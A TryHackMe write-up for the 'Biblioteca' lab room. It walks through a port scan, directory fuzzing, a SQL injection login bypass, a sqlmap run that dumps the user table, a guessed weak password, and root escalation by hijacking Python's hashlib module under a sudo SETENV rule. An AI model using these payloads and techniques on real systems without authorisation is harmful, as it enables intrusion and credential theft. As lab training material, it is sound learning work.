---
title: TryHackMe - Biblioteca
date: 2022-09-22 11:33:00 +0800
categories: TryHackMe                    # Change Templates to Writeup
tags: [CTF, sqli, privesc]
toc: true
image:
  path: /assets/images/thm/biblioteca/biblioteca.png
---


## Info

| Name         | Biblioteca                                                                                |
| ------------ | ----------------------------------------------------------------------------------------- |
| Room link    | [https://tryhackme.com/room/biblioteca](https://tryhackme.com/room/biblioteca)            |
| Difficulty   | Medium                                                                                    |
| Created by   | [hadrian3689](https://tryhackme.com/p/hadrian3689)                                         |
| solving date | Sep 22th 2022                                                                           |
| ----         |                                                                                           |


# Enumeration
- first let’s assign a variable with the machine IP
    
```bash
export ip=10.10.213.115
```
## nmap scan


    
```bash
nmap -Pn -sV $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-22 13:09 EET
Nmap scan report for 10.10.213.115
Host is up, received user-set (0.071s latency).
Scanned at 2022-09-22 13:09:26 EET for 9s
Not shown: 998 closed ports
Reason: 998 conn-refused
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    syn-ack Werkzeug httpd 2.0.2 (Python 3.8.10)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.80 seconds
```

- httpd service running on port 8000 and ssh on port 22

## Discovering the website

- Let’s start ffuf while we discover the website manually

```bash
ffuf -u http://$ip:8000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .html,.php -c 
```

### Navigating to the website

![Untitled](/assets/images/thm/biblioteca/login.png)

- nothing more than a login page

### View source

```html
<html>
	<head>
		<meta charset="UTF-8">
		<title> Login </title>
		<link rel="stylesheet" href="/static/style.css">		
	</head>
	<body></br></br></br></br></br>
		<div align="center">
		<div align="center" class="border">
			<div class="header">
				<h1 class="word">Login</h1>
			</div></br></br></br>
			<h2 class="word">
				<form action="/login" method="post">
				<div class="msg"></div>
					<input id="username" name="username" type="text" placeholder="Enter Your Username" class="textbox"/></br></br>
					<input id="password" name="password" type="password" placeholder="Enter Your Password" class="textbox"/></br></br></br>
					<input type="submit" class="btn" value="Sign In"></br></br>
				</form>
			</h2>
			<p class="bottom">Dont't have an account? <a class="bottom" href="/register"> Sign Up here</a></p>
		</div>
		</div>
	</body>
</html>
```

- Just HTML, Nothing interesting

### Fuzzing with ffuf

```bash
ffuf -u http://$ip:8000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .html,.php -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.35.245:8000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .html .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

login                   [Status: 200, Size: 856, Words: 43, Lines: 26]
logout                  [Status: 302, Size: 218, Words: 21, Lines: 4]
register                [Status: 200, Size: 964, Words: 51, Lines: 27]
:: Progress: [14091/14091] :: Job [1/1] :: 84 req/sec :: Duration: [0:02:46] :: Errors: 0 ::
```

# Exploitation

## SQL Injection

- Probably this login is vulnerable,  let’s try to exploit SQL injection
- the query might be like the following:
    
    ```sql
  SELECT * FROM site_users WHERE username='{sent_username}' AND password='{sent_password}'
    ```
    
- If there is no sanitization we could abuse the query like the following:
    
    ```sql
  SELECT * FROM site_users WHERE username='' OR 1=1 -- -' AND password='{sent_password}'
    ```
    
- `'OR 1=1 -- -` as the username, Notice two things:
    1. the rest of the query becomes a comment (after `-- -`) notice the gray color
    2. the query condition is always True because `1=1` is true, so True or anything is True  
- so the query becomes 
    ```sql
  SELECT * FROM site_users WHERE username='' OR 1=1
    ```
![Untitled](/assets/images/thm/biblioteca/sqli.png)

## Dumping the database with `sqlmap`

- Great, it's vulnerable, let’s dump the database with `sqlmap`

```bash
sqlmap -u http://$ip:8000/login --data "username='user'&password='pass'" --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:12:45 /2022-09-22/

[13:12:45] [INFO] testing connection to the target URL
[13:12:45] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:12:45] [INFO] testing if the target URL content is stable
[13:12:46] [INFO] target URL content is stable
[13:12:46] [INFO] testing if POST parameter 'username' is dynamic
[13:12:46] [WARNING] POST parameter 'username' does not appear to be dynamic
[13:12:46] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[13:12:46] [INFO] testing for SQL injection on POST parameter 'username'
[13:12:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:12:47] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:12:47] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:12:48] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[13:12:48] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[13:12:49] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[13:12:49] [INFO] testing 'Generic inline queries'
[13:12:49] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[13:12:50] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[13:12:50] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[13:12:51] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:13:01] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[13:13:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:13:04] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:13:04] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:13:05] [INFO] target URL appears to have 4 columns in query
[13:13:05] [INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
[13:13:06] [INFO] testing if POST parameter 'password' is dynamic
[13:13:06] [WARNING] POST parameter 'password' does not appear to be dynamic
[13:13:06] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[13:13:06] [INFO] testing for SQL injection on POST parameter 'password'
[13:13:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:13:07] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:13:08] [INFO] testing 'Generic inline queries'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[13:13:08] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[13:13:13] [INFO] target URL appears to be UNION injectable with 4 columns
[13:13:13] [INFO] POST parameter 'password' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
[13:13:13] [INFO] checking if the injection point on POST parameter 'password' is a false positive
POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 126 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=''' AND (SELECT 6800 FROM (SELECT(SLEEP(5)))jmAr) AND 'uRqQ'='uRqQ&password=''

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: username=''' UNION ALL SELECT NULL,CONCAT(0x7176707171,0x574c466476625546556e614652616a7063726e784979524f6759797a4d57764461754f4a4a557765,0x71626a6271),NULL,NULL-- -&password=''

Parameter: password (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: username=''&password=''' UNION ALL SELECT NULL,CONCAT(0x7176707171,0x735a775a62766d67615942797359447a49794e636865467a65457243784f4e56494a6a6756624772,0x71626a6271),NULL,NULL-- -
---
there were multiple injection points, please select the one to use for following injections:
[0] place: POST, parameter: username, type: Single quoted string (default)
[1] place: POST, parameter: password, type: Single quoted string
[q] Quit
> 0
[13:13:17] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[13:13:18] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[13:13:18] [INFO] fetching current database
[13:13:18] [INFO] fetching tables for database: 'website'
[13:13:18] [INFO] fetching columns for table 'users' in database 'website'
[13:13:18] [INFO] fetching entries for table 'users' in database 'website'
Database: website
Table: users
[2 entries]
+----+-------------------+-----------------+----------+
| id | email             | password        | username |
+----+-------------------+-----------------+----------+
| 1  | smokey@email.boop | [RETACTED]      | smokey   |
| 2  | admin@site.com    | [RETACTED]      | admin    |
+----+-------------------+-----------------+----------+

[13:13:18] [INFO] table 'website.users' dumped to CSV file '/home/juba/.local/share/sqlmap/output/10.10.213.115/dump/website/users.csv'
[13:13:18] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 48 times
[13:13:18] [INFO] fetched data logged to text files under '/home/juba/.local/share/sqlmap/output/10.10.213.115'

[*] ending @ 13:13:18 /2022-09-22/
```

# Gaining Access

- now we have two valid credentials, I tried to log in with ssh “smokey” credentials are valid but “admin” is not

![Untitled](/assets/images/thm/biblioteca/smokey.png)

## Local Enumeration

![Untitled](/assets/images/thm/biblioteca/LEnum.png)

- I started Enumerating the system manually, then I used `linpeas`, but I didn’t find anything interesting, then I checked out the first flag hint it’s “Weak password”
- So I started cracking hazel’the s password with hydra, while hydra is cracking the password with rockyou I started guess the password like hazel:password, etc.
- I found that hazel’s password is hazel 😄

## Gaining Access to Hazel’s account

```bash
ssh hazel@$ip # password: hazel
```

## User.txt flag

- navigate to hazel’s home directory

```bash
hazel@biblioteca:~$ ls
[hasher.py](http://hasher.py/)  user.txt
hazel@biblioteca:~$ cat user.txt
[REDACTED]
```

# Escalating Privileges to root

- We can set environmental variables and run **`/usr/bin/python3 /home/hazel/hasher.py` as root with no password**

```bash
hazel@biblioteca:~$ sudo -l
Matching Defaults entries for hazel on biblioteca:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hazel may run the following commands on biblioteca:
    **(root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py**
```

- hasher.py content
    
    ```python
  import hashlib
  
  def hashing(passw):
  
      md5 = hashlib.md5(passw.encode())
  
      print("Your MD5 hash is: ", end ="")
      print(md5.hexdigest())
  
      sha256 = hashlib.sha256(passw.encode())
  
      print("Your SHA256 hash is: ", end ="")
      print(sha256.hexdigest())
  
      sha1 = hashlib.sha1(passw.encode())
  
      print("Your SHA1 hash is: ", end ="")
      print(sha1.hexdigest())
  
  def main():
      passw = input("Enter a password to hash: ")
      hashing(passw)
  
  if __name__ == "__main__":
      main()
    ```
    
- we can set PYTHONENV to hijack `hashlib` python module
- we added `hashlib.py`  in `/tmp/py-module-hijacking/` to hijack hashlib module
- Note: You should name the file hashlib.py not hashlib
- hashlib.py content :
    
    ```python
    from pty import spawn
    spawn('/bin/bash')
    ```
    
    - fairly simple, just importing `spawn` from `pty` module and spawning `/bin/bash`

![Untitled](/assets/images/thm/biblioteca/root.png)

## root.txt flag

```bash
root@biblioteca:/tmp/py-module-hijacking# cd ~
root@biblioteca:/tmp/py-module-hijacking# ls 
root.txt   snap
root@biblioteca:/tmp/py-module-hijacking# cat root.txt
[REDACTED]
```
